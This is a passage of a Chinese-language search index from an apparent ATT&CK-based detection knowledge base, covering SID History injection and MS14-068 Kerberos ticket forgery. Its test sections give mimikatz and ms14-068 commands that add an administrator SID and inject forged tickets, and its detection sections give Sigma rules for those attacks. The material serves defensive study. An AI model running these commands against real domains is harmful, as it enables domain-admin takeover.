\u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1134-005 https://attack.mitre.org/techniques/T1134/005/ \u57df\u6e17\u900f-\u57df\u7ef4\u6743 https://uknowsec.cn/posts/notes/\u57df\u6e17\u900f-\u57df\u7ef4\u6743.html \u5982\u4f55\u5229\u7528SID History\u521b\u5efa\u57df\u63a7\u6743\u9650\u540e\u95e8\uff1f https://www.4hou.com/penetration/5476.html","title":"T1134-005-win-SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#t1134-005-win-sid","text":"","title":"T1134-005-win-SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#attck","text":"Windows\u5b89\u5168\u6807\u8bc6\u7b26\uff08SID\uff09\u662f\u6807\u8bc6\u7528\u6237\u6216\u7ec4\u5e10\u6237\u7684\u552f\u4e00\u503c\u3002Windows\u5b89\u5168\u5728\u5b89\u5168\u63cf\u8ff0\u7b26\u548c\u8bbf\u95ee\u4ee4\u724c\u4e2d\u90fd\u4f7f\u7528SID\u3002\u5e10\u6237\u53ef\u4ee5\u5728SID\u5386\u53f2Active Directory\u5c5e\u6027\u4fdd\u7559\u5176\u4ed6SID \uff0c\u4ece\u800c\u5141\u8bb8\u57df\u4e4b\u95f4\u53ef\u4e92\u64cd\u4f5c\u7684\u5e10\u6237\u8fc1\u79fb\uff08\u4f8b\u5982\uff0cSID\u5386\u53f2\u4e2d\u7684\u6240\u6709\u503c\u90fd\u5305\u542b\u5728\u8bbf\u95ee\u4ee4\u724c\u4e2d\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u673a\u5236\u8fdb\u884c\u7279\u6743\u5347\u7ea7\u3002\u501f\u52a9\u57df\u7ba1\u7406\u5458\uff08\u6216\u540c\u7b49\u6743\u9650\uff09\u6743\u9650\uff0c\u53ef\u4ee5\u5c06\u6536\u96c6\u7684\u6216\u4f17\u6240\u5468\u77e5\u7684SID\u503c\u63d2\u5165SID\u5386\u53f2\u8bb0\u5f55\u4e2d\uff0c\u4ee5\u6a21\u62df\u4efb\u610f\u7528\u6237/\u7ec4\uff0c\u4f8b\u5982\u4f01\u4e1a\u7ba1\u7406\u5458\u3002\u901a\u8fc7\u6a2a\u5411\u79fb\u52a8\u6280\u672f\uff08\u4f8b\u5982\uff0c \u8fdc\u7a0b\u670d\u52a1 \uff0c Windows Admin\u5171\u4eab \u6216 Windows\u8fdc\u7a0b\u7ba1\u7406\uff09 \uff0c\u6b64\u64cd\u4f5c\u53ef\u80fd\u5bfc\u81f4\u5bf9\u672c\u5730\u8d44\u6e90\u7684\u8bbf\u95ee\u6216\u5bf9\u539f\u672c\u65e0\u6cd5\u8bbf\u95ee\u7684\u57df\u7684\u8bbf\u95ee\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_1","text":"\u6d4b\u8bd5\u5de5\u5177\u53ef\u4ee5\u662fEmpire\uff0c\u4e5f\u53ef\u4ee5\u662fmimikatz\u3002 \u5982\u679c\u5728\u57df\u63a7\u5236\u5668\u4e0a\uff0c Empire \u53ef\u4ee5\u5411\u7528\u6237\u6dfb\u52a0SID\u5386\u53f2\u8bb0\u5f55\u3002 Mimikatz \u7684 MISC::AddSid \u6a21\u5757\u53ef\u4ee5\u5c06\u4efb\u4f55SID\u6216\u7528\u6237/\u7ec4\u5e10\u6237\u9644\u52a0\u5230\u7528\u6237\u7684SID\u5386\u53f2\u8bb0\u5f55\u4e2d\u3002 Mimikatz \u8fd8\u5229\u7528 SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165 \u6765\u6269\u5c55\u5176\u4ed6\u7ec4\u4ef6\u7684\u8303\u56f4\uff0c\u4f8b\u5982\u751f\u6210\u7684Kerberos Golden Ticket\u548cDCSync\u8d85\u51fa\u5355\u4e2a\u57df\u3002 Mimikatz\u652f\u6301SID\u5386\u53f2\u6ce8\u5165\u5230\u4efb\u4f55\u7528\u6237\u5e10\u6237\uff08\u9700\u8981\u57df\u7ba1\u7406\u5458\u6216\u7b49\u6548\u7684\u6743\u9650\uff09\u3002 \u6ce8\u610f\uff1a ADDSID\u5df2\u79fb\u81f32.1\u7248\u672c\u5206\u652f\u4e2d\u7684SID\u6a21\u5757\u3002 mimikatz \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:abcc\" \"exit\" mimikatz \"privilege::debug\" \"sid::patch\" \"sid::clear /sam:abcc\" \"exit\" \u6e05\u9664SID\u5386\u53f2\u8bb0\u5f55\u6ce8\u5165","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7\uff0c4766\u30014765","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_3","text":"\u6682\u65e0\u5177\u4f53\u5b9e\u4f8b\uff0c\u53ef\u53c2\u8003\u4e0a\u8ff0\u5b9e\u4f8b\u547d\u4ee4\uff1a mimikatz \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:abcc\" \"exit\"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_4","text":"\u6682\u65e0\uff08 \u6ce8\u610f\u4e8b\u9879 \uff1a4766\u30014765\u4ec5\u9650\u57df\u63a7\u4e3b\u673a\u662fWindows server 2016\u53cawin10\u4ee5\u4e0a\u4f1a\u4ea7\u751f\u6b64\u4e8b\u4ef6\uff09","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#sigma","text":"title: Windows SID\u5386\u53f2\u8bb0\u5f55\u521b\u5efa\u57df\u63a7\u6743\u9650\u540e\u95e8 description: \u57df\u73af\u5883\u6d4b\u8bd5 references: https://adsecurity.org/?p=1772 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: - 4766 #\u5c1d\u8bd5\u5c06SID\u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u5931\u8d25\u3002 - 4765 #\u5df2\u5c06 SID \u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u3002 condition: selection level: medium \u6ce8\u610f\u6b64\u68c0\u6d4b\u89c4\u5219\u7684\u9002\u7528\u8303\u56f4\uff1aWindows10\u3001Windows Server 2016\uff0c\u6b64\u4e8b\u4ef6\u5728\u5c06SID\u5386\u53f2\u8bb0\u5f55\u6dfb\u52a0\u5230\u5e10\u6237\u65f6\u751f\u6210\u3002","title":"sigma\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_6","text":"\u68c0\u6d4b\u7279\u5f81\u672a\u7ecf\u5b9e\u9645\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-005-win-SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E6%B3%A8%E5%85%A5/#_7","text":"MITRE-ATT&CK-T1134-005 https://attack.mitre.org/techniques/T1134/005/ \u57df\u6e17\u900f-\u57df\u7ef4\u6743 https://uknowsec.cn/posts/notes/\u57df\u6e17\u900f-\u57df\u7ef4\u6743.html \u5982\u4f55\u5229\u7528SID History\u521b\u5efa\u57df\u63a7\u6743\u9650\u540e\u95e8\uff1f https://www.4hou.com/penetration/5476.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/","text":"T1212-windows-MS14-068-KEKEO \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u7968\u636e\u4f20\u9012\u653b\u51fb\uff08PtT\uff09\u662f\u4e00\u79cd\u4e0d\u8bbf\u95ee\u8d26\u53f7\u5bc6\u7801\u800c\u4f7f\u7528Kerberos\u51ed\u636e\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u6cd5\u3002Kerberos\u8eab\u4efd\u8ba4\u8bc1\u53ef\u4ee5\u662f\u6a2a\u5411\u79fb\u52a8\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684\u7b2c\u4e00\u6b65\u3002 \u5728\u4f7f\u7528PtT\u6280\u672f\u65f6\uff0c\u53ef\u901a\u8fc7\u51ed\u636e\u5bfc\u51fa\u6280\u672f\u83b7\u53d6\u6709\u6548\u8d26\u53f7\u7684Kerberos\u7968\u636e\u3002PtT\u53ef\u80fd\u4f1a\u83b7\u53d6\u5230\u7528\u6237\u7684\u670d\u52a1\u7968\u636e\u6216\u7968\u636e\u6388\u4e88\u7968\u636e\uff08TGT\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u8bbf\u95ee\u7ea7\u522b\u3002\u670d\u52a1\u7968\u636e\u5141\u8bb8\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\uff0c\u800cTGT\u53ef\u7528\u4e8e\u4ece\u7968\u636e\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u8bf7\u6c42\u670d\u52a1\u7968\u636e\uff0c\u7528\u6765\u8bbf\u95ee\u7528\u6237\u6709\u6743\u8bbf\u95ee\u7684\u4efb\u4f55\u8d44\u6e90\u3002 PtT\u6280\u672f\u53ef\u4ee5\u4e3a\u4f7f\u7528Kerberos\u4f5c\u4e3a\u8eab\u4efd\u8ba4\u8bc1\u673a\u5236\u7684\u670d\u52a1\u83b7\u53d6\u767d\u94f6\u7968\u636e\uff0c\u5e76\u7528\u4e8e\u751f\u6210\u7968\u636e\u6765\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\u548c\u627f\u8f7d\u8be5\u8d44\u6e90\u7684\u7cfb\u7edf\uff08\u4f8b\u5982\uff0cSharePoint\uff09\u3002 PtT\u6280\u672f\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5bc6\u94a5\u5206\u53d1\u670d\u52a1\u8d26\u53f7KRBTGT\u5e10\u6237NTLM\u54c8\u5e0c\u6765\u83b7\u5f97\u57df\u7684\u9ec4\u91d1\u7968\u636e\uff0c\u4ece\u800c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u4efb\u4e00\u8d26\u53f7\u751f\u6210TGT\u3002 \u6d4b\u8bd5\u6848\u4f8b \u53ef\u53c2\u8003\uff1a \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08AD\u57df\u63a7\u65e5\u5fd7\uff09 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6d4b\u8bd5\u7559\u75d5\u6587\u4ef6\uff1a\u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: MS14-068-PYKEK description: windows server 2008 / windows 7 references: https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf tags: T1212 status: experimental author: 12306Bro logsource: product: windows service: Security detection: selection1: EventID: 4624 #\u8d26\u6237\u767b\u5f55 Account Domain: '*.*' #\u65b0\u767b\u5f55>\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM) selection2: EventID: 4672 #\u7ba1\u7406\u5458\u767b\u5f55 Account Domain: #\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3a\u7a7a) selection3: EventID: 4768 #Kerberos TGS\u8bf7\u6c42 Supplied Realm Name: '*.*' #\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u4e3aABC.COM) timeframe: last 5s condition: all of them level: medium \u5176\u4e2d4768\u9700\u8981\u6392\u9664\u6b63\u5e38\u6761\u4ef6\uff0c\u6bd4\u5982\u670d\u52a1 ID:S-1-0-0\u6216\u8005\u7528\u6237\u540d\u4e3antp$ \u8ba1\u7b97\u673a\u65f6\u95f4\u540c\u6b65 \u5efa\u8bae \u672c\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1212 https://attack.mitre.org/techniques/T1212/ \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK https://www.bbsmax.com/A/A7zgkjRPz4/","title":"T1212-windows-MS14-068-KEKEO"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#t1212-windows-ms14-068-kekeo","text":"","title":"T1212-windows-MS14-068-KEKEO"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#attck","text":"\u7968\u636e\u4f20\u9012\u653b\u51fb\uff08PtT\uff09\u662f\u4e00\u79cd\u4e0d\u8bbf\u95ee\u8d26\u53f7\u5bc6\u7801\u800c\u4f7f\u7528Kerberos\u51ed\u636e\u5bf9\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u6cd5\u3002Kerberos\u8eab\u4efd\u8ba4\u8bc1\u53ef\u4ee5\u662f\u6a2a\u5411\u79fb\u52a8\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684\u7b2c\u4e00\u6b65\u3002 \u5728\u4f7f\u7528PtT\u6280\u672f\u65f6\uff0c\u53ef\u901a\u8fc7\u51ed\u636e\u5bfc\u51fa\u6280\u672f\u83b7\u53d6\u6709\u6548\u8d26\u53f7\u7684Kerberos\u7968\u636e\u3002PtT\u53ef\u80fd\u4f1a\u83b7\u53d6\u5230\u7528\u6237\u7684\u670d\u52a1\u7968\u636e\u6216\u7968\u636e\u6388\u4e88\u7968\u636e\uff08TGT\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u8bbf\u95ee\u7ea7\u522b\u3002\u670d\u52a1\u7968\u636e\u5141\u8bb8\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\uff0c\u800cTGT\u53ef\u7528\u4e8e\u4ece\u7968\u636e\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u8bf7\u6c42\u670d\u52a1\u7968\u636e\uff0c\u7528\u6765\u8bbf\u95ee\u7528\u6237\u6709\u6743\u8bbf\u95ee\u7684\u4efb\u4f55\u8d44\u6e90\u3002 PtT\u6280\u672f\u53ef\u4ee5\u4e3a\u4f7f\u7528Kerberos\u4f5c\u4e3a\u8eab\u4efd\u8ba4\u8bc1\u673a\u5236\u7684\u670d\u52a1\u83b7\u53d6\u767d\u94f6\u7968\u636e\uff0c\u5e76\u7528\u4e8e\u751f\u6210\u7968\u636e\u6765\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\u548c\u627f\u8f7d\u8be5\u8d44\u6e90\u7684\u7cfb\u7edf\uff08\u4f8b\u5982\uff0cSharePoint\uff09\u3002 PtT\u6280\u672f\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5bc6\u94a5\u5206\u53d1\u670d\u52a1\u8d26\u53f7KRBTGT\u5e10\u6237NTLM\u54c8\u5e0c\u6765\u83b7\u5f97\u57df\u7684\u9ec4\u91d1\u7968\u636e\uff0c\u4ece\u800c\u4e3a\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u4efb\u4e00\u8d26\u53f7\u751f\u6210TGT\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_1","text":"\u53ef\u53c2\u8003\uff1a \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08AD\u57df\u63a7\u65e5\u5fd7\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_4","text":"\u6d4b\u8bd5\u7559\u75d5\u6587\u4ef6\uff1a\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#sigma","text":"title: MS14-068-PYKEK description: windows server 2008 / windows 7 references: https://www.blackhat.com/docs/us-15/materials/us-15-Metcalf-Red-Vs-Blue-Modern-Active-Directory-Attacks-Detection-And-Protection-wp.pdf tags: T1212 status: experimental author: 12306Bro logsource: product: windows service: Security detection: selection1: EventID: 4624 #\u8d26\u6237\u767b\u5f55 Account Domain: '*.*' #\u65b0\u767b\u5f55>\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM) selection2: EventID: 4672 #\u7ba1\u7406\u5458\u767b\u5f55 Account Domain: #\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3a\u7a7a) selection3: EventID: 4768 #Kerberos TGS\u8bf7\u6c42 Supplied Realm Name: '*.*' #\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728KEKEO\u653b\u51fb\u65f6\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u4e3aABC.COM) timeframe: last 5s condition: all of them level: medium \u5176\u4e2d4768\u9700\u8981\u6392\u9664\u6b63\u5e38\u6761\u4ef6\uff0c\u6bd4\u5982\u670d\u52a1 ID:S-1-0-0\u6216\u8005\u7528\u6237\u540d\u4e3antp$ \u8ba1\u7b97\u673a\u65f6\u95f4\u540c\u6b65","title":"sigma\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_6","text":"\u672c\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-KEKEO/#_7","text":"MITRE-ATT&CK-T1212 https://attack.mitre.org/techniques/T1212/ \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK https://www.bbsmax.com/A/A7zgkjRPz4/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/","text":"T1212-windows-MS14-068-PYKEK \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u6765\u5c1d\u8bd5\u6536\u96c6\u51ed\u636e\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u51ed\u636e\u548c\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u53ef\u80fd\u4f1a\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0c\u4ee5\u6b64\u4f5c\u4e3a\u83b7\u53d6\u6709\u7528\u51ed\u636e\u7684\u9014\u5f84\u6216\u89c4\u907f\u83b7\u53d6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\u7684\u8fc7\u7a0b\u3002\u5176\u4e2d\u4e00\u4e2a\u793a\u4f8b\u662fMS14-068\uff0c\u5b83\u9488\u5bf9Kerberos\uff0c\u53ef\u7528\u4e8e\u4f7f\u7528\u57df\u7528\u6237\u6743\u9650\u4f2a\u9020Kerberos\u7968\u8bc1.\u5bf9\u51ed\u636e\u8bbf\u95ee\u7684\u5229\u7528\u8fd8\u53ef\u80fd\u5bfc\u81f4\u7279\u6743\u5347\u7ea7\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u76ee\u6807\u8fc7\u7a0b\u6216\u83b7\u53d6\u7684\u51ed\u636e\u3002 \u6d4b\u8bd5\u6848\u4f8b \u53ef\u53c2\u8003\uff1a \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08AD\u57df\u63a7\u65e5\u5fd7\uff09 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u6b65\u9aa4 \u57df\u63a7\u4e3b\u673a\uff08Windows server 2008\uff09 \u57df\u5185\u4e3b\u673a\uff08Windows 7 SP1\uff09 whoami /user #\u57df\u5185\u4e3b\u673a\u67e5\u627e\u5f53\u524d\u7528\u6237SID dir \\\\DC\\C$ #\u67e5\u770b\u8bbf\u95eeDC\u7684\u6743\u9650 ms14-.exe -u \u57df\u6210\u5458\u540d@\u57df\u540d -s \u57df\u6210\u5458sid -d \u57df\u63a7\u5236\u5668\u5730\u5740 -p \u57df\u6210\u5458\u5bc6\u7801 #\u57df\u673a\u5668\u662f\u53ef\u4ee5\u548c\u57df\u63a7\u5236\u5668\u4e92\u901a\u5219\u4f1a\u521b\u5efa.ccache\u6587\u4ef6 \u7968\u636e\u6ce8\u5165 mimikatz # kerberos::purge //\u6e05\u7a7a\u5f53\u524d\u673a\u5668\u4e2d\u6240\u6709\u51ed\u8bc1\uff0c\u5982\u679c\u6709\u57df\u6210\u5458\u51ed\u8bc1\u4f1a\u5f71\u54cd\u51ed\u8bc1\u4f2a\u9020 mimikatz # kerberos::list //\u67e5\u770b\u5f53\u524d\u673a\u5668\u51ed\u8bc1 mimikatz # kerberos::ptc \u7968\u636e\u6587\u4ef6 //\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5185\u5b58\u4e2d \u4f7f\u7528mimikatz\u5c06\u7968\u636e\u6ce8\u5165\u5230\u5f53\u524d\u5185\u5b58\u4e2d\uff0c\u4f2a\u9020\u51ed\u8bc1\uff0c\u5982\u679c\u6210\u529f\u5219\u62e5\u6709\u57df\u7ba1\u7406\u6743\u9650\uff0c\u53ef\u4efb\u610f\u8bbf\u95ee\u57df\u4e2d\u6240\u6709\u673a\u5668 \u6d4b\u8bd5\u7559\u75d5 \u6d4b\u8bd5\u7559\u75d5\u6587\u4ef6\uff1a MS14-068-PYKEK-windows.log \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: MS14-068-PYKEK description: windows server 2008 / windows 7 references: https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/golden_ticket.md tags: T1212 status: experimental author: 12306Bro logsource: product: windows service: Security detection: selection1: EventID: 4624 #\u8d26\u6237\u767b\u5f55 Account Domain: '*.*' #\u65b0\u767b\u5f55>\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM) Account Name: '*' #\u65b0\u767b\u5f55>\u8d26\u6237\u540d(\u4e0d\u540c\u4e8e\u5b89\u5168\u6807\u8bc6\u7684\u5e10\u6237\uff0c\u6b64\u6761\u4ef6\u5b9e\u73b0\u8d77\u6765\u8f83\u4e3a\u590d\u6742) selection2: EventID: 4672 #\u7ba1\u7406\u5458\u767b\u5f55 Account Domain: '*.*' #\u8d26\u6237\u57df(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8d26\u6237\u57df\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u8d26\u6237\u57df\u4e3aABC.COM) selection3: EventID: 4768 #Kerberos TGS\u8bf7\u6c42 Supplied Realm Name: '*.*' #\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0(\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u5e94\u4e3aABC\uff0c\u5f53\u5b58\u5728PYKEK\u653b\u51fb\u65f6\uff0c\u5df2\u63d0\u4f9b\u7684\u9886\u57df\u540d\u79f0\u4e3aABC.COM) timeframe: last 5s condition: all of them level: medium \u5efa\u8bae \u672c\u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u68c0\u9a8c\uff0c\u8c28\u614e\u4f7f\u7528 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1212 https://attack.mitre.org/techniques/T1212/ \u5185\u7f51\u6e17\u900f\u4e4bPTH&PTT&PTK https://www.bbsmax.com/A/A7zgkjRPz4/","title":"T1212-windows-MS14-068-PYKEK"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#t1212-windows-ms14-068-pykek","text":"","title":"T1212-windows-MS14-068-PYKEK"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1212-win-ms14-068-PYKEK/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u6765\u5c1d\u8bd5\u6536\u96c6\u51ed\u636e\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u51ed\u636e\u548c\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u53ef\u80fd\u4f1a\u88ab\u653b\u51fb\u8005\u5229\u7528\uff0